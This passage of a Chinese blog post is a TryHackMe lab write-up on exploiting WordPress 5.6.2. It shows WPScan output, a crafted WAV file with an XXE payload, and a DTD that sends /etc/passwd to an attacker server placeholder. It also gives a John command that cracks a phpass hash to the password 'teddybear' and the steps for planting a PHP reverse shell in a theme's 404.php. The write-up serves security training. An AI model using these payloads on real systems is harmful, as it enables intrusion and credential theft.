class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.6</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/style.css, Match: &#x27;Version: 1.6&#x27;</span><br><br>[+] twentytwentyone<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.8</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty-One<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwentyone/</span><br> | <span class="hljs-attribute">Description</span>: Twenty Twenty-One is a blank canvas for your ideas <span class="hljs-keyword">and</span> it makes the block editor your best brush. Wi...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.1</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css, Match: &#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating Users (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br> Brute Forcing Author IDs - <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span> &lt;====================================&gt; (<span class="hljs-number">10</span> / <span class="hljs-number">10</span>) <span class="hljs-number">100.00%</span> <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span><br><br>[i] <span class="hljs-built_in">User</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] Corporation Test<br> | Found <span class="hljs-attribute">By</span>: Rss Generator (Passive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has <span class="hljs-keyword">not</span> been output.<br>[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wpscan.com/register</span><br><br>[+] <span class="hljs-attribute">Finished</span>: Wed Oct <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">16</span>:<span class="hljs-number">14</span> <span class="hljs-number">2023</span><br>[+] Requests <span class="hljs-attribute">Done</span>: <span class="hljs-number">472</span><br>[+] Cached <span class="hljs-attribute">Requests</span>: <span class="hljs-number">18</span><br>[+] Data <span class="hljs-attribute">Sent</span>: <span class="hljs-number">123.333</span> KB<br>[+] Data <span class="hljs-attribute">Received</span>: <span class="hljs-number">631.685</span> KB<br>[+] Memory <span class="hljs-attribute">used</span>: <span class="hljs-number">247.805</span> MB<br>[+] Elapsed <span class="hljs-attribute">time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">52</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>目前已知一个普通用户username和password,登录wp-login.php</p>
+<p>所以第二步上传一个wav文件弹shell</p>
+<p>.wav shell的制作:</p>
+<p>把<code>RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://YOURSEVERIP:PORT/NAMEEVIL.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00</code>覆盖到一个正常wav文件中，否则上传会报错。</p>
+<p>仔细看shell文本中有一个NAMEEVIL.dtd文件，是需要制作一个NAMEEVIL.dtd文件，内容如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">init</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://YOURSERVERIP:PORT/?p=%file;&#x27;&gt;&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在本地起python3或者<code>php -S 0.0.0.0:端口</code>监听</p>
+<p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ress-5-6-2/image-20231011191031118.png" srcset="/img/loading.gif" lazyload alt="image-20231011191031118"></p>
+<p>base64解码即可</p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>base64解出了wp-config.php文件</p>
+<p>翻到了数据库名、数据库普通用户名密码，数据库类型mysql，登录进入mysql后找到wp user表</p>
+<p>用户名：corp-001</p>
+<p>密码：$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1</p>
+<p>这是一个hash</p>
+<p>用john破解，<code>john --format:phpass mima.txt --wordlist:/usr/share/wordlists/rockyou.txt</code></p>
+<p>获得明文密码teddybear。</p>
+<p>用获取到的用户名密码登录wp-login.php，</p>
+<p>由于是管理员用户，可以在左侧菜单栏中直接选择修改theme主题里面的twentytwenty&#x2F;404.php。所以可以在里面直接编辑，把里面原本的都删了，写入反弹shell。</p>
+<p>上这个网站<a target="_blank" rel="noopener" href="https://reverse.7sec.pw/">https://reverse.7sec.pw/</a>   选择里面的php pentestmonkey，复制文本然后覆盖到404.php里面。</p>
+<p>然后本机开nc监听，访问http:&#x2F;&#x2F;$ip&#x2F;wp-content&#x2F;themes&#x2F;twentytwenty&#x2F;404.php ,弹回shell，拿到flag。Basic </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tryhackme_wordpress_5.6.2</div>
+      <div>http://groundctl2majortom.github.io/2023/10/01/tryhackme-wordpress-5-6-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>GroundCtl2MajorTom</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/09/OWASP-Top-10-2021-%E6%80%BB%E7%BB%93/" title="OWASP_Top_10-2021_总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">OWASP_Top_10-2021_总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/09/07/tryhackme-buffer-overflow/" title="tryhackme_buffer_overflow">
+                        <span class="hidden-mobile">tryhackme_buffer_overflow</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
